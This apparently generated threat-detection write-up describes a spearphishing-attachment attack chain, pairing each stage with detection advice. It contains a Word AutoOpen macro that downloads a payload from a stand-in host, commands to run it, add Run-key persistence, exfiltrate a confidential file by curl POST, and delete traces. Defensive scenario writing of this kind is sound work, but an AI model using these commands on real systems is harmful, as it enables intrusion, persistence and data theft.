@@ -1,0 +1,82 @@
+<output>
+Pattern Name: Spearphishing Attachment
+
+Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that compromises the system.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook (or any email client)
+   - **User Action**: The user receives a spearphishing email containing a malicious attachment (e.g., a Word document).
+   - **Key Artifacts**: Email headers, attachment file (e.g., `malicious_document.docx`).
+   - **Detection Focus**: Monitor for unusual email patterns, such as emails from unknown senders with attachments that have executable macros.
+
+2. **Opening the Malicious Attachment**
+   - **Application Involved**: Microsoft Word
+   - **User Action**: The user opens the attachment, triggering a macro that downloads a payload.
+   - **Key Artifacts**: Macro execution logs, document properties indicating macro settings.
+   - **Detection Focus**: Look for macro execution events in Word, especially those that download files from the internet.
+
+   ```shell
+   # Example of a macro that could be embedded in the document
+   Sub AutoOpen()
+       Dim objHTTP As Object
+       Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+       objHTTP.Open "GET", "http://malicious-website.com/payload.exe", False
+       objHTTP.Send
+       ' Save the payload to a temporary location
+       Dim stream As Object
+       Set stream = CreateObject("ADODB.Stream")
+       stream.Type = 1 ' Binary
+       stream.Open
+       stream.Write objHTTP.responseBody
+       stream.SaveToFile Environ("TEMP") & "\payload.exe", 2 ' Overwrite
+       stream.Close
+   End Sub
+   ```
+
+3. **Execution of the Downloaded Payload**
+   - **Application Involved**: Windows Explorer (or cmd.exe)
+   - **User Action**: The macro saves the payload to the user's temp directory and executes it.
+   - **Key Artifacts**: File creation events for `payload.exe`, process creation events for `cmd.exe` or `explorer.exe`.
+   - **Detection Focus**: Monitor for execution of files from the temp directory, especially those that are newly created and have been executed immediately after creation.
+
+   ```shell
+   # Command to execute the downloaded payload
+   start "" "%TEMP%\payload.exe"
+   ```
+
+4. **Establishing Persistence**
+   - **Application Involved**: Windows Registry
+   - **User Action**: The payload modifies the registry to ensure it runs on startup.
+   - **Key Artifacts**: Registry keys under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+   - **Detection Focus**: Monitor for changes to registry keys that indicate persistence mechanisms.
+
+   ```shell
+   # Example command to add a registry entry for persistence
+   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "%TEMP%\payload.exe" /f
+   ```
+
+5. **Data Exfiltration**
+   - **Application Involved**: Web Browser (e.g., Chrome)
+   - **User Action**: The payload connects to a command and control (C2) server to exfiltrate data.
+   - **Key Artifacts**: Network traffic to known malicious IP addresses or domains.
+   - **Detection Focus**: Monitor for unusual outbound connections, especially to IPs or domains associated with known threats.
+
+   ```shell
+   # Example of a command to exfiltrate data
+   curl -X POST -F "data=@C:\Users\Victim\Documents\confidential.txt" http://malicious-website.com/exfiltrate
+   ```
+
+6. **Cleanup and Evasion**
+   - **Application Involved**: Windows Command Line
+   - **User Action**: The payload deletes its traces to avoid detection.
+   - **Key Artifacts**: Deletion of temporary files, clearing of logs.
+   - **Detection Focus**: Monitor for file deletion commands executed shortly after the payload runs.
+
+   ```shell
+   # Command to delete the malicious payload after execution
+   del "%TEMP%\payload.exe"
+   ```
+
+</output>
